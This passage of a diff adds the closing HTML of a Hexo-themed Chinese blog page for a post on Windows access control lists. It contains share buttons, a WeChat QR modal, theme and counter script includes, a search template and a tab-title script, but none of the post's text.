+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://byqiyou.github.io/2020/02/23/Windows——Access-Control-List/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Windows——Access Control List》 — 七友&url=https://byqiyou.github.io/2020/02/23/Windows——Access-Control-List/&via=https://byqiyou.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://byqiyou.github.io/2020/02/23/Windows——Access-Control-List/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="//api.qrserver.com/v1/create-qr-code/?data=https://byqiyou.github.io/2020/02/23/Windows——Access-Control-List/" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+<script>
+(function() {
+    var OriginTitile = document.title, titleTime;
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            document.title = 'Leave';
+            clearTimeout(titleTime);
+        } else {
+            document.title = 'Come back';
+            titleTime = setTimeout(function() {
+                document.title = OriginTitile;
+            },2000);
+        }
+    });
+})();
+</script>
+
+
+
+</body>
+</html>
